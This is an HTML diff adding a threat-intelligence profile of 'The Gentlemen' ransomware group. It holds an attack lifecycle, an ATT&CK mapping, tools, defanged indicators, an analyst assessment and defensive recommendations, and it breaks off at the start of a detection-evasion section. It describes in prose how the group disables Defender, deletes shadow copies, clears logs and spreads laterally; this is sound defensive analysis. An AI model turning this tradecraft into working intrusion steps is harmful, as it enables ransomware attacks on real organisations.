+    <div class="section-title">Attack Lifecycle <small>Opportunistic edge-device compromise → 21-vector self-propagation → double-extortion</small></div>
+  </div>
+  <div class="section-body">
+    <div class="prose">
+      <p>Initial access is affiliate-driven and opportunistic rather than centrally curated: internet-exposed edge devices (Fortinet FortiGate, Cisco appliances), OWA/Microsoft 365 credential brute-forcing, and VPN/RDP abuse are the dominant entry vectors, with the group's own leaked chat logs showing active tracking and evaluation of CVE-2024-55591 (FortiOS management-interface authentication bypass), CVE-2025-32433 (Erlang/OTP SSH vulnerability relevant to Cisco-hosted contexts), and CVE-2025-33073 (NTLM relay/reflection) as preferred exploitation paths (Check Point Research, 2026). A dedicated operator, "quant," maintains a high-specification credential-harvesting rig (Threadripper PRO, 128 GB RAM, RTX 5090) purpose-built for brute-forcing and a custom collection tool nicknamed "buildx641" for pulling credentials out of compromised OWA/O365 mail stores.</p>
+      <p>Once inside, the group's defining technical trait is the aggressiveness of its lateral spread: Microsoft documented up to 21 independent execution attempts per target host, staged from a hidden SMB share (<code>share$</code>) the malware creates on the initial foothold and an embedded copy of PsExec it deploys onto the network. From there it fans out via remote file copy over C$ administrative shares, PsExec, WMIC process creation, PowerShell remoting (<code>Invoke-Command</code>), direct WMI class invocation, and both user- and SYSTEM-context scheduled tasks and Windows services — each attempted from two staging locations (the infected host's own SMB share, and the target's local <code>C:\Temp</code>) to maximize the odds that at least one vector succeeds against a given host's specific defensive posture (Microsoft Security Blog, 2026-05-28).</p>
+      <p>Immediately before encryption, the locker systematically disables Microsoft Defender's real-time protection and firewall, deletes Volume Shadow Copy backups, terminates roughly 50 processes spanning databases, backup software (Veeam, Ipelius), EDR agents, and remote-access tools, and clears the Security, System, and Application Windows Event Logs. Encryption itself uses a per-file ephemeral Curve25519 key exchange feeding an XChaCha20 stream cipher, with a size-tiered strategy — files at or under 1 MB are fully encrypted, larger files are partially encrypted in distributed chunks at operator-selectable speed settings (roughly 27% down to under 1% of file content, depending on the "fast," "superfast," or "ultrafast" mode chosen) — a deliberate speed/thoroughness tradeoff that lets affiliates encrypt very large environments before defenders can react. Exfiltrated data and the encryption event both feed into a double-extortion negotiation conducted over individual, affiliate-specific Tox IDs rather than a centralized negotiation portal, and the group maintains a public X/Twitter account specifically to name non-paying victims for reputational pressure (Halcyon, 2026).</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 04 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div class="section-title">TTPs — MITRE ATT&amp;CK Mapping <small>Enterprise only — no ICS/OT evidence identified in source material</small></div>
+  </div>
+  <div class="section-body">
+    <div class="mitre-grid">
+      <div class="mitre-cell green">
+        <div class="mitre-tactic">Reconnaissance</div>
+        <div class="mitre-id">T1595</div>
+        <div class="mitre-name">Active Scanning</div>
+        <div class="mitre-note">[HIGH] Custom port-scanning utility "gogo.exe" plus Advanced IP Scanner and Nmap used for network discovery (FortiGuard, 2026).</div>
+      </div>
+      <div class="mitre-cell red">
+        <div class="mitre-tactic">Initial Access</div>
+        <div class="mitre-id">T1190</div>
+        <div class="mitre-name">Exploit Public-Facing Application</div>
+        <div class="mitre-note">[HIGH] Active tracking/exploitation of CVE-2024-55591 (FortiOS), CVE-2025-32433 (Erlang SSH), CVE-2025-33073 (NTLM relay) per leaked internal chat logs (Check Point Research, 2026).</div>
+      </div>
+      <div class="mitre-cell red">
+        <div class="mitre-tactic">Initial Access</div>
+        <div class="mitre-id">T1078</div>
+        <div class="mitre-name">Valid Accounts</div>
+        <div class="mitre-note">[HIGH] Stolen OWA/Microsoft 365 credentials and brute-forced VPN/RDP access used for entry (Check Point Research; FortiGuard, 2026).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Credential Access</div>
+        <div class="mitre-id">T1110</div>
+        <div class="mitre-name">Brute Force</div>
+        <div class="mitre-note">[HIGH] Dedicated operator "quant" runs a purpose-built high-spec brute-force rig (Threadripper PRO/128GB/RTX 5090) (Check Point Research, 2026).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Credential Access</div>
+        <div class="mitre-id">T1003</div>
+        <div class="mitre-name">OS Credential Dumping</div>
+        <div class="mitre-note">[MEDIUM] Custom tools "KslDump"/"KslKatz" documented for LSASS/Kerberos credential extraction (Check Point Research, 2026).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Lateral Movement</div>
+        <div class="mitre-id">T1021.002</div>
+        <div class="mitre-name">SMB / Windows Admin Shares</div>
+        <div class="mitre-note">[HIGH] Remote file copy over C$ administrative shares plus embedded PsExec staged via a self-created hidden SMB share (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Lateral Movement</div>
+        <div class="mitre-id">T1021.006</div>
+        <div class="mitre-name">Windows Remote Management</div>
+        <div class="mitre-note">[HIGH] PowerShell remoting (Invoke-Command) used as one of the 21 documented lateral-spread execution vectors (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Execution</div>
+        <div class="mitre-id">T1047</div>
+        <div class="mitre-name">Windows Management Instrumentation</div>
+        <div class="mitre-note">[HIGH] WMIC process creation and direct WMI class invocation from multiple staged paths (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell amber">
+        <div class="mitre-tactic">Persistence</div>
+        <div class="mitre-id">T1053.005</div>
+        <div class="mitre-name">Scheduled Task</div>
+        <div class="mitre-note">[HIGH] Tasks "UpdateSystem"/"UpdateUser" for startup persistence and "gentlemen_system" during SYSTEM privilege escalation (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell amber">
+        <div class="mitre-tactic">Persistence</div>
+        <div class="mitre-id">T1547.001</div>
+        <div class="mitre-name">Registry Run Keys</div>
+        <div class="mitre-note">[HIGH] HKLM/HKCU Run-key entries "GupdateS" (SYSTEM) and "GupdateU" (user) (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell amber">
+        <div class="mitre-tactic">Defense Evasion</div>
+        <div class="mitre-id">T1562.001</div>
+        <div class="mitre-name">Impair Defenses: Disable Tools</div>
+        <div class="mitre-note">[HIGH] Scripted Defender real-time-monitoring disable, service stop, and self-exclusion via Set-MpPreference/Stop-Service (Huntress, 2026) — full commands in Section 11.</div>
+      </div>
+      <div class="mitre-cell amber">
+        <div class="mitre-tactic">Defense Evasion</div>
+        <div class="mitre-id">T1070.001</div>
+        <div class="mitre-name">Clear Windows Event Logs</div>
+        <div class="mitre-note">[HIGH] Targeted clearing of Security/System/Application logs only, verified via Event IDs 104 and 1102 — other logs left intact (Huntress, 2026).</div>
+      </div>
+      <div class="mitre-cell red">
+        <div class="mitre-tactic">Impact</div>
+        <div class="mitre-id">T1490</div>
+        <div class="mitre-name">Inhibit System Recovery</div>
+        <div class="mitre-note">[HIGH] Volume Shadow Copy deletion via vssadmin and wmic prior to encryption (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell red">
+        <div class="mitre-tactic">Impact</div>
+        <div class="mitre-id">T1489</div>
+        <div class="mitre-name">Service Stop</div>
+        <div class="mitre-note">[HIGH] ~50 targeted process/service kills spanning databases, backup software, EDR agents, and remote-access tools pre-encryption (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell red">
+        <div class="mitre-tactic">Impact</div>
+        <div class="mitre-id">T1486</div>
+        <div class="mitre-name">Data Encrypted for Impact</div>
+        <div class="mitre-note">[HIGH] Per-file ephemeral Curve25519 ECDH + XChaCha20 stream cipher, size-tiered partial encryption for large files (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Command &amp; Control</div>
+        <div class="mitre-id">T1090</div>
+        <div class="mitre-name">Proxy</div>
+        <div class="mitre-note">[HIGH] SOCKS proxy tunnel via a disguised scheduled task (svchost32.exe) beaconing every 2 minutes (Huntress, 2026) — full command in Section 11.</div>
+      </div>
+      <div class="mitre-cell">
+        <div class="mitre-tactic">Exfiltration</div>
+        <div class="mitre-id">T1567</div>
+        <div class="mitre-name">Exfiltration Over Web Service</div>
+        <div class="mitre-note">[MEDIUM] Double-extortion data staging ahead of leak-site publication; specific exfil-channel tooling not fully documented in public source material as of compile date.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 05 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div class="section-title">Targeting Profile</div>
+  </div>
+  <div class="section-body">
+    <div class="two-col">
+      <div>
+        <div style="font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 10px;">Sector Targeting</div>
+        <div class="sector-list">
+          <div class="sector-row">
+            <span class="sector-name">IT / Managed Services</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:95%"></div></div>
+            <span class="sector-pct">PRIMARY</span>
+          </div>
+          <div class="sector-row">
+            <span class="sector-name">Manufacturing</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:75%"></div></div>
+            <span class="sector-pct">HIGH</span>
+          </div>
+          <div class="sector-row">
+            <span class="sector-name">Healthcare</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:70%"></div></div>
+            <span class="sector-pct">HIGH</span>
+          </div>
+          <div class="sector-row">
+            <span class="sector-name">Construction</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:55%"></div></div>
+            <span class="sector-pct">MED</span>
+          </div>
+          <div class="sector-row">
+            <span class="sector-name">Government</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:50%"></div></div>
+            <span class="sector-pct">MED</span>
+          </div>
+          <div class="sector-row">
+            <span class="sector-name">Financial Services (BFSI)</span>
+            <div class="sector-bar-wrap"><div class="sector-bar" style="width:45%"></div></div>
+            <span class="sector-pct">MED</span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="kv">
+          <div class="kv-row"><span class="kv-key">Geographies</span><span class="kv-val">66 countries, all six inhabited continents. H1 2026 regional volume: Europe/UK 144 attacks, Asia-Pacific 114, Middle East &amp; Africa 56, South America 46 (The Cyber Express, 2026). Thailand is the single largest national total (27 victims); only ~7% of victims are US-based (Halcyon, 2026).</span></div>
+          <div class="kv-row"><span class="kv-key">Victim Profile</span><span class="kv-val">Mid-to-large organizations with centralized identity infrastructure (AD/OWA/M365) and continuous operational demands — downtime-sensitive environments maximize ransom leverage.</span></div>
+          <div class="kv-row"><span class="kv-key">Preferred Entry</span><span class="kv-val">Internet-exposed edge devices (Fortinet, Cisco), OWA/M365 credential attacks, VPN/RDP abuse; documented reuse of data stolen from one victim's environment to socially engineer a second, unrelated victim.</span></div>
+          <div class="kv-row"><span class="kv-key">Target Doctrine</span><span class="kv-val">Opportunistic and affiliate-driven rather than centrally curated. Explicit avoidance of Commonwealth of Independent States (CIS) countries — no targeting of Russia or CIS-member states identified in source material (FortiGuard, 2026).</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 06 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">06</div>
+    <div class="section-title">Tools, Malware &amp; Infrastructure</div>
+  </div>
+  <div class="section-body">
+    <div class="tool-list">
+      <div class="tool-item">
+        <div class="tool-header">
+          <span class="tool-name">GENTLEMEN LOCKER</span>
+          <span class="tool-tag">CUSTOM ENCRYPTOR · WIN/LINUX/BSD/NAS (GO) + ESXi (C)</span>
+        </div>
+        <div class="tool-desc">Multi-platform ransomware payload. Per-file ephemeral Curve25519 ECDH key exchange feeding an XChaCha20 stream cipher; size-tiered encryption (full for files ≤1MB, variable-percentage chunked encryption for larger files at operator-selectable "fast/superfast/ultrafast" speed settings); mandatory password argument at execution, limiting automated sandbox analysis. Ransom note <code>README-GENTLEMEN.txt</code>, desktop wallpaper <code>gentlemen.bmp</code>, encrypted-file extension <code>.umc16h</code> (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="tool-item amber">
+        <div class="tool-header">
+          <span class="tool-name">GLOCKER</span>
+          <span class="tool-tag">CUSTOM · RAAS ADMIN PANEL</span>
+        </div>
+        <div class="tool-desc">Affiliate management, target assignment, and payout-tracking panel. Notably built by administrator zeta88 using AI coding assistance ("vibe-coded") in approximately three days — a data point on the group's development velocity and its willingness to trade traditional secure-development discipline for iteration speed (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item amber">
+        <div class="tool-header">
+          <span class="tool-name">KslDump / KslKatz</span>
+          <span class="tool-tag">CUSTOM · CREDENTIAL ACCESS</span>
+        </div>
+        <div class="tool-desc">LSASS memory and Kerberos ticket dumping tools referenced in leaked internal tooling channels (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">NetExec (NXC)</span>
+          <span class="tool-tag">OSS · AD ENUMERATION / LATERAL MOVEMENT</span>
+        </div>
+        <div class="tool-desc">Open-source Active Directory attack-surface enumeration and exploitation swiss-army-knife, standard in the group's internal toolset (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">TaskHound / PrivHound / CertiHound</span>
+          <span class="tool-tag">OSS · AD/ADCS ATTACK-PATH MAPPING</span>
+        </div>
+        <div class="tool-desc">Privilege-escalation and AD Certificate Services abuse-path discovery tooling used during internal reconnaissance (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item amber">
+        <div class="tool-header">
+          <span class="tool-name">Titanis</span>
+          <span class="tool-tag">CUSTOM · ETW / LOGGING MANIPULATION</span>
+        </div>
+        <div class="tool-desc">Windows logging and Event Tracing for Windows (ETW) manipulation tooling; Check Point assesses the underlying technique lineage traces to published zerosalarium security research on ETW/logging bypass (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">MANSPIDER</span>
+          <span class="tool-tag">OSS · FILE SHARE SEARCH</span>
+        </div>
+        <div class="tool-desc">Automated content search across SMB shares, used to locate sensitive data ahead of exfiltration for double-extortion (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">PowerZure</span>
+          <span class="tool-tag">OSS · AZURE / CLOUD ABUSE</span>
+        </div>
+        <div class="tool-desc">Open-source Azure post-exploitation toolkit used against cloud-hosted identity and infrastructure (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">ZeroPulse / Velociraptor</span>
+          <span class="tool-tag">C2/REMOTE ACCESS · LEGITIMATE DFIR TOOL ABUSE</span>
+        </div>
+        <div class="tool-desc">Velociraptor — a legitimate, widely-used open-source DFIR/endpoint-visibility platform — is repurposed by the group for its own remote access and collection needs, alongside the custom "ZeroPulse" component. Cloudflare Zero Trust tunnels, WireGuard, and OpenVPN provide additional C2 transport (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">Embedded PsExec</span>
+          <span class="tool-tag">LOLBIN · LATERAL MOVEMENT</span>
+        </div>
+        <div class="tool-desc">Bundled with the locker and deployed via the malware's self-created hidden SMB share as one of seven-plus distinct remote-execution vectors used during self-propagation (Microsoft Security Blog, 2026-05-28).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">gogo.exe / Sputnik</span>
+          <span class="tool-tag">CUSTOM · PORT SCANNING &amp; OSINT RECON</span>
+        </div>
+        <div class="tool-desc">gogo.exe performs internal network port scanning; "Sputnik" is a custom OSINT browser extension used for target reconnaissance (Check Point Research, 2026).</div>
+      </div>
+      <div class="tool-item blue">
+        <div class="tool-header">
+          <span class="tool-name">chamd5.org / hashcracking_bot</span>
+          <span class="tool-tag">3RD-PARTY SERVICE · CREDENTIAL CRACKING</span>
+        </div>
+        <div class="tool-desc">Outsourced hash-cracking services used against harvested credential material rather than in-house cracking infrastructure alone (Check Point Research, 2026).</div>
+      </div>
+    </div>
+    <div style="margin-top: 14px; font-family: var(--body); font-size: 10.5px; color: var(--text-dim);">Vulnerability cross-reference: no vuln card in this project's library currently covers CVE-2024-55591, CVE-2025-32433, CVE-2025-33073, or the broader set of ~14 CVEs FortiGuard associates with this group's exploitation activity (2024-1709 through 2026-69836). None of the 8 existing vuln cards (Heartbleed, Spectre/Meltdown, PaperCut, PrintNightmare, Rockwell Logix Auth Bypass, WatchGuard Firebox Auth Bypass, SonicWall SonicOS Access Control, Chrome WebGL OOB Write) match — gap noted rather than a fabricated cross-link. <em>No companion incident card on file either.</em></div>
+  </div>
+</div>
+
+<!-- SECTION 07 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">07</div>
+    <div class="section-title">Indicators of Compromise <small>All IPs and domains defanged</small></div>
+  </div>
+  <div class="section-body">
+    <div class="ioc-defang-note">⚠ IOC HANDLING — All IPs and domains in this table are defanged. Reconstruct before use in detection tooling. Reference URLs in Section 13 are NOT defanged.</div>
+    <table class="ioc-table">
+      <thead>
+        <tr>
+          <th>Type</th>
+          <th>Value / Description</th>
+          <th>Source</th>
+          <th>Date</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="type-label">HASH</td><td class="val">22b38dad7da097ea03aa28d0614164cd25fafeb1383dbc15047e34c8050f6f67 — Gentlemen Windows encryptor (SHA-256)</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">HASH</td><td class="val">078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b — Embedded PsExec binary (SHA-256)</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">HASH</td><td class="val">fe1033335a045c696c900d435119d210361966e2fb5cd1ba3382608cfa2c8e68 — Ransom wallpaper bitmap, gentlemen.bmp (SHA-256)</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">IP</td><td class="val">193.233.202[.]17:44729</td><td>Huntress</td><td>2026</td></tr>
+        <tr><td class="type-label">FILE</td><td class="val">README-GENTLEMEN.txt (ransom note filename)</td><td>Check Point Research / Microsoft MSTIC</td><td>2026</td></tr>
+        <tr><td class="type-label">FILE</td><td class="val">gentlemen.bmp (desktop wallpaper replacement)</td><td>Check Point Research</td><td>2026</td></tr>
+        <tr><td class="type-label">FILE</td><td class="val">.umc16h (extension appended to encrypted files)</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">REGISTRY</td><td class="val">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\GupdateS</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">REGISTRY</td><td class="val">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\GupdateU</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">TASK</td><td class="val">Scheduled task names: WindowsConnSvc, UpdateSystem, UpdateUser, gentlemen_system</td><td>Microsoft MSTIC / Huntress</td><td>2026</td></tr>
+        <tr><td class="type-label">MALWARE</td><td class="val">Ransom:Win64/Gentlemen.A (Microsoft Defender detection name)</td><td>Microsoft MSTIC</td><td>2026-05-28</td></tr>
+        <tr><td class="type-label">NOTE</td><td class="val">Check Point Research published a full appendix of 30 Windows and 3 Linux sample hashes plus a YARA rule keyed on the strings "Silent mode," "README-GENTLEMEN.txt," "gentlemen.bmp," and "gentlemen_system" — not fully reproduced here; see Check Point's report for the complete set.</td><td>Check Point Research</td><td>2026</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- SECTION 08 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">08</div>
+    <div class="section-title">Analyst Assessment</div>
+  </div>
+  <div class="section-body">
+    <div class="two-col" style="margin-bottom: 18px;">
+      <div class="kv">
+        <div class="kv-row"><span class="kv-key">Overall Threat Level</span><span class="kv-val red">CRITICAL</span></div>
+        <div class="kv-row"><span class="kv-key">Attribution Confidence</span><span class="kv-val amber">HIGH (identity) / MEDIUM (full roster)</span></div>
+        <div class="kv-row"><span class="kv-key">Trajectory</span><span class="kv-val red">Escalating — fastest documented RaaS scaling curve to date</span></div>
+        <div class="kv-row"><span class="kv-key">Most Dangerous Capability</span><span class="kv-val red">Five-platform simultaneous encryption paired with 21-vector self-propagation, compressing time-to-impact across large heterogeneous environments</span></div>
+        <div class="kv-row"><span class="kv-key">Primary Intel Gap</span><span class="kv-val amber">No MITRE G-ID or government advisory yet; independent verification of leak-derived claims beyond Check Point's own corroboration is limited</span></div>
+      </div>
+      <div>
+        <div style="font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px;">Ecosystem / Affiliated Groups</div>
+        <div class="alias-grid">
+          <span class="alias-chip">Qilin (progenitor RaaS — split origin)</span>
+          <span class="alias-chip">ArmCorp (predecessor cluster identity)</span>
+          <span class="alias-chip">HelloKitty (positively regarded peer, per leaked chats)</span>
+          <span class="alias-chip">Dragon Force (positively regarded peer)</span>
+          <span class="alias-chip">Black Basta / Devman (negatively regarded rival)</span>
+        </div>
+      </div>
+    </div>
+    <div class="prose">
+      <p>The group's growth rate is itself the primary threat signal here, more than any single technical capability. Matching in five months what took Akira a year and Qilin eighteen months to reach is not simply a function of aggressive marketing (the 90% affiliate split) — it reflects a genuinely competent, genuinely multi-platform toolchain that lowers the skill floor for affiliates while still producing five-figure-to-six-figure ransom outcomes (the documented UK consultancy negotiation closed at $190,000 against an opening demand of $250,000). A RaaS operation that can absorb and productively deploy a large, loosely-coordinated affiliate base without its core tooling falling apart is a durable threat model, not a flash in the pan.</p>
+      <p>There is a genuine epistemological wrinkle worth naming directly: an unusually large share of what is publicly known about this group's internal structure, personnel, and culture derives from one leaked archive of the group's own internal chat logs (the May 2026 "Rocket" breach), not from independent law-enforcement seizure or long-term external telemetry the way older, better-established RaaS brands have been profiled. Check Point Research's willingness to publish detailed personnel attribution rests on cross-corroboration between that leaked chat content and independently observable artifacts — malware samples, C2 infrastructure, TOX IDs tied to actual campaigns — which is a reasonable evidentiary basis, but analysts should hold open the possibility that some leaked internal chat content reflects affiliate bravado or exaggeration rather than verified operational fact, particularly around claimed revenue figures and negotiation outcomes not independently confirmed by victim-side reporting.</p>
+      <p>Forward trajectory: the group's current volume and geographic spread now sit well past the threshold that has historically triggered coordinated international law-enforcement action against comparable brands (LockBit's 2024 disruption, Hive's 2023 takedown) — no such action has been publicly reported against The Gentlemen as of this compile date, but the gap between "operationally significant enough to attract that response" and "actually receiving it" has narrowed. What would change this assessment: a formal government attribution/sanction action (none exists yet), independent (non-leak-derived) confirmation of the personnel roster via arrest or seizure, or a public law-enforcement disruption of the "Rocket" infrastructure itself.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 09 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">09</div>
+    <div class="section-title">Defensive Recommendations</div>
+  </div>
+  <div class="section-body">
+    <div class="two-col">
+      <div class="cm-list">
+        <div class="cm-item">
+          <span class="cm-num">01</span>
+          <div>
+            <div class="cm-text"><strong>Patch and restrict management-plane access on internet-facing Fortinet FortiGate and Cisco edge devices</strong> — do not expose SonicOS/FortiOS/Cisco management interfaces directly to the internet; apply CVE-2024-55591 and CVE-2025-32433 fixes without delay.</div>
+            <div class="cm-ttp">Counters: T1190</div>
+          </div>
+        </div>
+        <div class="cm-item">
+          <span class="cm-num">02</span>
+          <div>
+            <div class="cm-text"><strong>Enforce phishing-resistant MFA</strong> on all OWA/Microsoft 365 and VPN/RDP remote-access paths — the group's dedicated brute-force infrastructure and credential-collection tooling specifically target these entry points.</div>
+            <div class="cm-ttp">Counters: T1078, T1110, T1133</div>
+          </div>
+        </div>
+        <div class="cm-item">
+          <span class="cm-num">03</span>
+          <div>
+            <div class="cm-text"><strong>Deploy Attack Surface Reduction rules blocking PsExec/WMI-originated process creation</strong> and unsigned/untrusted executable execution — this directly disrupts the documented 21-vector lateral-spread mechanism.</div>
+            <div class="cm-ttp">Counters: T1021.002, T1047, T1053.005</div>
+          </div>
+        </div>
+        <div class="cm-item">
+          <span class="cm-num">04</span>
+          <div>
+            <div class="cm-text"><strong>Enable EDR/AV tamper protection</strong> so real-time protection cannot be disabled via scripted <code>Set-MpPreference</code>/<code>Stop-Service</code> commands run with local administrative rights.</div>
+            <div class="cm-ttp">Counters: T1562.001</div>
+          </div>
+        </div>
+      </div>
+      <div class="cm-list">
+        <div class="cm-item">
+          <span class="cm-num">05</span>
+          <div>
+            <div class="cm-text"><strong>Forward Security/System/Application Windows Event Logs off-host to a centralized, tamper-resistant SIEM in near-real-time</strong> — local log clearing (Event IDs 104/1102) is a core anti-forensics step in this group's playbook and only defeats analysis if logs never leave the host.</div>
+            <div class="cm-ttp">Counters: T1070.001</div>
+          </div>
+        </div>
+        <div class="cm-item">
+          <span class="cm-num">06</span>
+          <div>
+            <div class="cm-text"><strong>Segregate backup infrastructure (Veeam and similar) onto isolated management networks with immutable/air-gapped retention</strong> — the group explicitly targets and terminates backup software as a pre-encryption step.</div>
+            <div class="cm-ttp">Counters: T1489, T1490, T1486</div>
+          </div>
+        </div>
+        <div class="cm-item">
+          <span class="cm-num">07</span>
+          <div>
+            <div class="cm-text"><strong>Alert on anomalous scheduled-task creation using system-process-mimicking binary names</strong> (e.g. non-standard "svchost"-named executables) paired with outbound connections to non-standard high ports — the documented C2 persistence mechanism generates noisy, detectable Task Scheduler events (107/101/203) if monitored.</div>
+            <div class="cm-ttp">Counters: T1053.005, T1090</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 10 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">10</div>
+    <div class="section-title">OPSEC Procedures <small>Observed infrastructure hygiene, rotation patterns, anti-forensics</small></div>
+  </div>
+  <div class="section-body">
+    <div class="opsec-list">
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Infrastructure Rotation</span>
+          <span class="opsec-confidence">[MEDIUM]</span>
+        </div>
+        <div class="opsec-desc">C2/remote-access transport is deliberately diversified across Cloudflare Zero Trust tunnels, WireGuard, and OpenVPN rather than a single fixed channel. Negotiation communications are decentralized across at least 8 distinct per-affiliate Tox IDs spanning 29 identified campaigns rather than a single centralized channel — this structurally limits the impact of any single takedown or Tox-ID compromise (Check Point Research, 2026).</div>
+      </div>
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Living-off-the-Land Ratio</span>
+          <span class="opsec-confidence">[HIGH]</span>
+        </div>
+        <div class="opsec-desc">A hybrid model: heavy reliance on native/LOLBin tooling for lateral movement and system manipulation specifically (PsExec, WMIC, PowerShell remoting, vssadmin, schtasks, ICACLS), layered with custom-built tooling reserved for credential harvesting and AD/ADCS attack-path enumeration (KslDump/KslKatz, TaskHound/PrivHound/CertiHound, NetExec). The native-tool preference for propagation specifically appears deliberate — it blends into expected Windows administrative activity across the 21 documented execution vectors, while the custom tooling is reserved for tasks where off-the-shelf options are less effective.</div>
+      </div>
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Anti-Forensics Routines</span>
+          <span class="opsec-confidence">[HIGH]</span>
+        </div>
+        <div class="opsec-desc">Selective (not blanket) event log clearing — Security, System, and Application logs specifically, verified operationally via Event IDs 104 and 1102 — alongside prefetch file removal, Defender diagnostic log deletion, RDP log removal, and PowerShell command-history deletion. An optional free-space wipe using random data in 64 MB blocks is available for affiliates seeking to defeat file-carving recovery. Notably, other Windows event logs are left untouched by the standard playbook — a real, documented detection gap rather than comprehensive anti-forensics (Huntress, 2026).</div>
+      </div>
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Timing &amp; Operational Patterns</span>
+          <span class="opsec-confidence">[LOW]</span>
+        </div>
+        <div class="opsec-desc">Source material reviewed does not document specific beacon jitter configuration, victim-timezone-relative work-hour clustering, or dwell-time-before-action patterns with enough precision to state a pattern here — stated as a genuine intelligence gap rather than inferred.</div>
+      </div>
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Tooling Hygiene</span>
+          <span class="opsec-confidence">[MEDIUM]</span>
+        </div>
+        <div class="opsec-desc">The locker requires a mandatory password argument at execution, which meaningfully limits automated sandbox/AV-farm analysis of samples obtained without the correct invocation. Per-file ephemeral key generation (Curve25519) is itself a form of tooling hygiene against bulk static decryption research. Counterpoint: the RaaS admin panel (GLOCKER) was reportedly built via rapid AI-assisted "vibe coding" in about three days, suggesting comparatively low investment in secure-development discipline for internal tooling relative to the locker itself.</div>
+      </div>
+      <div class="opsec-item">
+        <div class="opsec-header">
+          <span class="opsec-category">Communications Security</span>
+          <span class="opsec-confidence">[MEDIUM]</span>
+        </div>
+        <div class="opsec-desc">Administrator zeta88 reportedly directs affiliates to use AI assistants (DeepSeek, Qwen, Kimi, Emi are the group's stated preferences) as a technical reference tool in place of discussing sensitive operational detail in internal chat channels — a deliberate attempt to reduce the internal comms footprint available for later compromise or leak. This discipline notably did not prevent the May 2026 "Rocket" database leak itself, which exposed roughly 44 MB of the very chat archive this practice was presumably meant to minimize.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 11 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">11</div>
+    <div class="section-title">Detection Evasion <small>Specific techniques, LOLBin sequences, EDR bypass patterns</small></div>
+  </div>
+  <div class="section-body">
+    <div class="evasion-list">
+      <div class="evasion-item">
+        <div class="evasion-header">
+          <span class="evasion-technique">Defender Real-Time Protection Disable</span>
+          <span class="evasion-ttp">T1562.001</span>
+        </div>
+        <div class="evasion-tags">
